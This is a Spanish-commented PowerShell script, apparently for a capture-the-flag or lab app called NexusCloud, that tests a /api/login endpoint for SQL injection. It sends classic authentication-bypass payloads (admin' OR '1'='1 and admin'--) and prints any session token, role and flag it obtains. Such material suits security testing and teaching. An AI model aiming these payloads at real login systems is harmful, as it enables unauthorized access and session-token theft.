<#
.SYNOPSIS
    Script de auditoría de Inyección SQL (SQLi) para NexusCloud desde PowerShell.
.DESCRIPTION
    Ejecuta pruebas de penetración contra el endpoint de autenticación (/api/login)
    evaluando diferentes vectores de inyección SQL (Bypass de autenticación, comentarios, etc.)
    utilizando únicamente comandos nativos de PowerShell (Invoke-RestMethod).
.PARAMETER BaseUrl
    URL base del despliegue (ej. https://tu-dominio.vercel.app o http://localhost:3000).
.EXAMPLE
    .\test-lab.ps1 -BaseUrl "https://tu-dominio.vercel.app"
#>

[CmdletBinding()]
param(
    [Parameter(Position = 0)]
    [string]$BaseUrl = "http://localhost:3000"
)

# Forzar TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$BaseUrl = $BaseUrl.TrimEnd('/')
$loginEndpoint = "$BaseUrl/api/login"

Write-Host @"
========================================================================
     _   _                      ____ _                 _ 
    | \ | | _____  ___   _ ___ / ___| | ___  _   _  __| |
    |  \| |/ _ \ \/ / | | / __| |   | |/ _ \| | | |/ _` |
    | |\  |  __/>  <| |_| \__ \ |___| | (_) | |_| | (_| |
    |_| \_|\___/_/\_\\__,_|___/\____|_|\___/ \__,_|\__,_|
       PowerShell SQL Injection (SQLi) Audit Toolkit
========================================================================
"@ -ForegroundColor Cyan
Write-Host "Target Endpoint: $loginEndpoint" -ForegroundColor Yellow
Write-Host "Fecha:           $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
Write-Host "------------------------------------------------------------------------`n"

# 1. Verificación previa con credenciales incorrectas (Comportamiento esperado)
Write-Host "[*] 1. Comprobando respuesta normal con credenciales erróneas..." -ForegroundColor Cyan
$normalPayload = @{
    username = "usuario_inexistente"
    password = "password_invalido"
} | ConvertTo-Json

try {
    $resNormal = Invoke-RestMethod -Uri $loginEndpoint -Method Post -ContentType "application/json" -Body $normalPayload
    Write-Host " [?] El servidor aceptó credenciales arbitrarias sin SQLi." -ForegroundColor Yellow
} catch {
    $code = $_.Exception.Response.StatusCode.value__
    if ($code -eq 401) {
        Write-Host " [OK] El servidor rechazó correctamente con HTTP 401 Unauthorized." -ForegroundColor Green
    } else {
        Write-Host " [!] Código recibido: $code" -ForegroundColor DarkYellow
    }
}

# 2. Vector principal: Bypass clásico por tautología (OR '1'='1)
Write-Host "`n[*] 2. Probando Vector SQLi #1: Tautología (admin' OR '1'='1)..." -ForegroundColor Yellow
$sqliPayload1 = @{
    username = "admin' OR '1'='1"
    password = "cualquiercosa"
} | ConvertTo-Json

try {
    $res1 = Invoke-RestMethod -Uri $loginEndpoint -Method Post -ContentType "application/json" -Body $sqliPayload1
    if ($res1.success) {
        Write-Host " [VULNERABLE] ¡Bypass de autenticación conseguido!" -ForegroundColor Green
        Write-Host "    Usuario autenticado: $($res1.user.username)" -ForegroundColor White
        Write-Host "    Rol del usuario:     $($res1.user.role)" -ForegroundColor White
        Write-Host "    Token de sesión:     $($res1.user.token)" -ForegroundColor White
        if ($res1.user.internal_flag) {
            Write-Host "    BANDERA CAPTURADA:   $($res1.user.internal_flag)" -ForegroundColor Magenta
        }
        if ($res1.debug_query) {
            Write-Host "    Consulta SQL alterada: $($res1.debug_query)" -ForegroundColor DarkCyan
        }
    } else {
        Write-Host " [-] El servidor no respondió con éxito al payload." -ForegroundColor Red
    }
} catch {
    Write-Host " [!] Error en la solicitud: $_" -ForegroundColor Red
}

# 3. Vector secundario: Comentario de fin de línea SQL (admin'--)
Write-Host "`n[*] 3. Probando Vector SQLi #2: Truncamiento por comentario (admin'--)..." -ForegroundColor Yellow
$sqliPayload2 = @{
    username = "admin'--"
    password = ""
} | ConvertTo-Json

try {
    $res2 = Invoke-RestMethod -Uri $loginEndpoint -Method Post -ContentType "application/json" -Body $sqliPayload2
    if ($res2.success) {
        Write-Host " [VULNERABLE] ¡Bypass con comentario exitoso!" -ForegroundColor Green
        Write-Host "    Usuario: $($res2.user.username)" -ForegroundColor White
        Write-Host "    Token:   $($res2.user.token)" -ForegroundColor White
    }
} catch {
    Write-Host " [-] No vulnerable a este vector específico o endpoint no disponible." -ForegroundColor DarkGray
}

Write-Host "`n========================================================================" -ForegroundColor Cyan
Write-Host "  Auditoría SQLi finalizada. Ejecutado 100% mediante PowerShell." -ForegroundColor Green
Write-Host "========================================================================`n" -ForegroundColor Cyan
